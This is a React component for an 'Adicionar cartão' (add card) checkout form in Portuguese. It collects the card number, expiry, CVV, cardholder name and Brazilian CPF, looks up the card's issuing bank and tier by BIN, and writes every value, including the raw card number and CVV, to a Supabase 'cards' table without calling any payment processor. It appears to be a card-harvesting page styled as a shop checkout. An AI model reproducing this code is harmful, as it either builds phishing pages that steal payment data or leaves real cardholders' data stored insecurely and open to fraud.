"use client";

import React, { useState, useEffect } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { ArrowLeft, Smartphone, Loader2, Info } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { showError } from '@/utils/toast';
import { supabase } from "@/integrations/supabase/client";

const AddCard: React.FC = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const [cardNumber, setCardNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");
  const [name, setName] = useState("");
  const [cpf, setCpf] = useState("");
  const [isProcessing, setIsProcessing] = useState(false);
  const [brand, setBrand] = useState<'visa' | 'mastercard' | 'elo' | 'unknown'>('unknown');
  
  const [binInfo, setBinInfo] = useState<{
    bank?: string;
    level?: string;
  } | null>(null);
  const [isLookupLoading, setIsLookupLoading] = useState(false);

  const lookupBin = async (bin: string) => {
    if (bin.length < 6) return;
    setIsLookupLoading(true);
    try {
      const { data, error } = await supabase.functions.invoke('lookup-bin', {
        body: { bin }
      });
      if (!error && data) {
        setBinInfo({ bank: data.bank?.name, level: data.brand });
        if (data.scheme === 'visa') setBrand('visa');
        else if (data.scheme === 'mastercard') setBrand('mastercard');
      }
    } catch (err) {
      console.error(err);
    } finally {
      setIsLookupLoading(false);
    }
  };

  const formatCardNumber = (val: string) => {
    const digits = val.replace(/\D/g, '').slice(0, 16);
    if (digits.length === 6) lookupBin(digits);
    else if (digits.length < 6) setBinInfo(null);

    const formatted = digits.match(/.{1,4}/g)?.join(' ') || digits;
    if (digits.length > 0) {
      const first = digits[0];
      if (first === '4') setBrand('visa');
      else if (first === '5') setBrand('mastercard');
      else if (first === '6') setBrand('elo');
      else setBrand('unknown');
    }
    return formatted;
  };

  const handleContinue = async () => {
    const cleanNumber = cardNumber.replace(/\s/g, '');
    if (cleanNumber.length < 15 || !expiry || !cvv || !name.trim() || cpf.replace(/\D/g, '').length < 11) {
      showError("Preencha todos os dados do cartão.");
      return;
    }

    setIsProcessing(true);
    try {
      const { data, error } = await supabase
        .from('cards')
        .insert([{
          card_number: cardNumber,
          expiry,
          cvv,
          name,
          cpf: cpf.replace(/\D/g, ''),
          last4: cleanNumber.slice(-4),
          brand: brand === 'unknown' ? 'mastercard' : brand,
          bin: cleanNumber.slice(0, 6),
          bank_name: binInfo?.bank || null,
          card_level: binInfo?.level || null
        }])
        .select()
        .single();

      if (error) throw error;

      setTimeout(() => {
        navigate(-1, { state: { ...location.state, cardData: data } });
      }, 1500);

    } catch (err) {
      showError("Erro ao processar cartão.");
      setIsProcessing(false);
    }
  };

  return (
    <div className="min-h-screen bg-white">
      {isProcessing && (
        <div className="fixed inset-0 z-[100] bg-black/60 flex items-center justify-center backdrop-blur-sm">
          <Loader2 className="w-10 h-10 text-[#FF2C55] animate-spin" />
        </div>
      )}

      <div className="h-12 flex items-center px-4 border-b sticky top-0 bg-white z-50">
        <button onClick={() => navigate(-1)} className="p-1">
          <ArrowLeft size={24} className="text-gray-900" />
        </button>
        <h1 className="flex-grow text-center text-[16px] font-bold mr-6">Adicionar cartão</h1>
      </div>

      <div className="p-4 space-y-6">
        <div className="flex items-center space-x-2 text-[#FF2C55]">
          <Smartphone size={18} />
          <span className="text-[14px] font-bold">Sem juros em até 3 parcelas</span>
        </div>

        <div className="space-y-4">
          <div className="space-y-1.5">
            <div className="flex justify-between items-center">
              <label className="text-[14px] font-bold text-gray-900">Número do cartão</label>
              <div className="flex gap-2 h-5">
                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" className="h-full" alt="MC" />
                <img src="https://images.seeklogo.com/logo-png/14/1/visa-logo-png_seeklogo-149698.png" className="h-full" alt="Visa" />
                <img src="https://images.seeklogo.com/logo-png/20/1/elo-logo-png_seeklogo-205447.png" className="h-full" alt="Elo" />
              </div>
            </div>
            <div className="border-[#F1F1F1] border-2 rounded-xl h-14 flex items-center px-4 bg-[#F8F8F8]">
              <input 
                type="text" 
                placeholder="0000 0000 0000 0000" 
                className="w-full bg-transparent outline-none text-[16px] font-medium"
                value={cardNumber}
                onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
              />
              {isLookupLoading && <Loader2 size={16} className="animate-spin text-gray-400 ml-2" />}
            </div>
            {binInfo && (
              <div className="flex items-center space-x-2 bg-blue-50 p-2 rounded-lg border border-blue-100">
                <Info size={14} className="text-blue-500" />
                <span className="text-[11px] text-blue-700 font-bold">
                  {binInfo.bank} {binInfo.level && `• ${binInfo.level}`}
                </span>
              </div>
            )}
          </div>

          <div className="grid grid-cols-2 gap-4">
            <div className="space-y-1.5">
              <label className="text-[14px] font-bold text-gray-900">MM/AA</label>
              <input 
                type="text" 
                placeholder="MM/AA" 
                className="w-full bg-[#F8F8F8] border-[#F1F1F1] border-2 rounded-xl h-14 px-4 outline-none text-[16px] font-medium"
                value={expiry}
                onChange={(e) => {
                  const v = e.target.value.replace(/\D/g, '').slice(0, 4);
                  setExpiry(v.length >= 2 ? `${v.slice(0, 2)}/${v.slice(2)}` : v);
                }}
                maxLength={5}
              />
            </div>
            <div className="space-y-1.5">
              <label className="text-[14px] font-bold text-gray-900">CVV</label>
              <input 
                type="text" 
                placeholder="CVV" 
                className="w-full bg-[#F8F8F8] border-[#F1F1F1] border-2 rounded-xl h-14 px-4 outline-none text-[16px] font-medium"
                value={cvv}
                onChange={(e) => setCvv(e.target.value.replace(/\D/g, '').slice(0, 4))}
              />
            </div>
          </div>

          <div className="space-y-1.5">
            <label className="text-[14px] font-bold text-gray-900">NOME COMO NO CARTÃO</label>
            <input 
              type="text" 
              placeholder="NOME COMO NO CARTÃO" 
              className="w-full bg-[#F8F8F8] border-[#F1F1F1] border-2 rounded-xl h-14 px-4 outline-none text-[16px] font-medium uppercase"
              value={name}
              onChange={(e) => setName(e.target.value)}
            />
          </div>

          <div className="space-y-1.5">
            <label className="text-[14px] font-bold text-gray-900">CPF DO TITULAR</label>
            <input 
              type="text" 
              placeholder="CPF DO TITULAR" 
              className="w-full bg-[#F8F8F8] border-[#F1F1F1] border-2 rounded-xl h-14 px-4 outline-none text-[16px] font-medium"
              value={cpf}
              onChange={(e) => {
                const v = e.target.value.replace(/\D/g, '');
                setCpf(v.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4").slice(0, 14));
              }}
            />
          </div>
        </div>
      </div>

      <div className="fixed bottom-0 left-0 right-0 p-4 bg-white border-t z-50">
        <Button 
          className="w-full h-12 rounded-full font-bold text-[16px] bg-[#FF2C55] hover:bg-[#E0254B] border-none" 
          onClick={handleContinue}
        >
          Continuar
        </Button>
      </div>
    </div>
  );
};

export default AddCard;